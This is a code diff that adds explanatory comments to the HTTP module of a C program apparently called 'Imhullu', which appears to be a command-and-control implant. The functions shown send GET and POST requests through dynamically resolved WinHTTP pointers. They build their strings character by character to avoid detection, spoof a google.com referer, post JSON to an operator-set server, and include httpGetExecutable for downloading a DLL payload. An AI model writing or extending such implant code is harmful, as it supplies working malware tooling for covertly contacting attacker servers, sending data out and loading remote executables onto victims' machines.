@@ -1,24 +1,35 @@
 #include "../include/http.h"
 
-// will be overriden by ImhulluCLI
-//#define SERVER '1','9','2','.','1','6','8','.','0','.','1',0
-//#define PORT 5001
+#define WINHTTP_ACCESS_TYPE_NO_PROXY 1
+#define WINHTTP_FLAG_REFRESH 0x00000100
 
+/*
+This function sends a get request to a web server
+
+Input:
+    PAPI api: a pointer to the API structure
+    WCHAR* wcServer: host name or an IP address of an HTTP server
+    INTERNET_PORT port: port number
+    WCHAR* wcPath: path to query
+Output:
+    Success -> CHAR*: web server response
+    Failure -> NULL
+*/
 CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
 {
     WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
     WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
     WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };
+    // use google.com as the referer
     WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
     WCHAR wProxy[] = { 'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0 };
     WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
 
-    DWORD dwBufferSize = 0;
-
+    // open an http session
     HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
     (
         wUserAgent,
-        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
+        WINHTTP_ACCESS_TYPE_NO_PROXY,
         wProxy,
         wProxyBypass,
         0
@@ -35,6 +46,7 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     }
     #endif
 
+    // connect to the web server
     HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)
     (
         hSession,
@@ -54,6 +66,7 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     }
     #endif
 
+    // open/craft a request
     HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
     (
         hConnect,
@@ -84,7 +97,9 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
         NULL,
         0,
         NULL,
-        0, 0, 0
+        0,
+        0,
+        0
     );
 
     #ifdef DEBUG
@@ -98,6 +113,7 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     }
     #endif
 
+    // receive a response
     BOOL rcvResponse = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
     #ifdef DEBUG
     if (rcvResponse == FALSE)
@@ -115,6 +131,7 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     BOOL result = FALSE;
 
     // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
+    // notice this is the number in `Content-Length: 28375`. The number is returned as a string, not an int.
     ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
     (
         hRequest,
@@ -127,9 +144,10 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
 
     if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
     {
-        // Allocate the calculated buffer
+        // Allocate the calculated buffer to store the content length string
         lpContentLength = ((MALLOC)api->malloc)(dwBufferLength/sizeof(WCHAR));
 
+        // write the content length string into lpContentLength
         result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
         (
             hRequest,
@@ -141,8 +159,11 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
         );
     }
 
+    DWORD dwBufferSize = 0;
+
     if (result)
     {
+        // store the lpContentLength in dwBufferSize as an int
         dwBufferSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
     }
     else
@@ -153,6 +174,7 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
         #endif
     }
 
+    // allocate the buffer to store the response
     CHAR* cpBuffer = (CHAR*)((CALLOC)api->calloc)((size_t)(dwBufferSize), (size_t)sizeof(WCHAR));
     DWORD bufferIndexChange = 0;
     DWORD availableBytes = 0;
@@ -160,8 +182,11 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     LPDWORD lpActuallyRead = &actuallyRead;
     BOOL readSuccess = FALSE;
 
+    // get the amount of data, in bytes, available to be read with WinHttpReadData
     while(((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0)
     {
+        // read the available data
+        // write the data to the current index in cpBuffer
         readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)
         (
             hRequest,
@@ -174,6 +199,7 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
         if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwBufferSize / sizeof(WCHAR))
         { break; }
 
+        // modify the index in cpBuffer to write the next data to
         bufferIndexChange += availableBytes/sizeof(WCHAR);
     }
 
@@ -186,23 +212,32 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     return NULL;
 }
 
-void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, CHAR* data)
+/*
+This function sends a post request to an endpoint
+
+Input:
+    PAPI api: a pointer to the API struct
+    WCHAR* server: a hostname or an IP address
+    INTERNET_PORT port: a port number
+    const WCHAR endpoint: a path on the server
+    CCHAR* data: a json data
+Output:
+    The function returns nothing
+*/
+void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, CCHAR* data)
 {
     LPSTR pszData = (LPSTR)data;
     BOOL bResults = FALSE;
 
     WCHAR wVerb[] = { 'P', 'O', 'S', 'T', 0 };
-
     WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
-
     WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };
-
     WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
-
     WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
     WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
     WCHAR contentType[] = { 'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e', ':', ' ', 'a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '/', 'j', 's', 'o', 'n', 0 };
 
+    // open an http session
     HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
     (
         wUserAgent,
@@ -214,12 +249,11 @@ void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpo
 
     if (hSession)
     {
-        // Specify an HTTP server
+        // specify an HTTP server
         HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)(hSession, server, port, 0);
 
         if (hConnect) {
-            // Create an HTTP request handle
-            #define WINHTTP_FLAG_REFRESH 0x00000100
+            // create an HTTP request
             HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
             (
                 hConnect,
@@ -233,7 +267,7 @@ void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpo
 
             if (hRequest)
             {
-                // Send the request
+                // send the request
                 bResults = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)
                 (
                     hRequest,
@@ -256,6 +290,7 @@ void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpo
     ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);
 }
 
+// TODO: combine this function with GetRequest
 LPVOID httpGetExecutable(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint, WCHAR* wServer, INTERNET_PORT dwPort)
 {
     WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
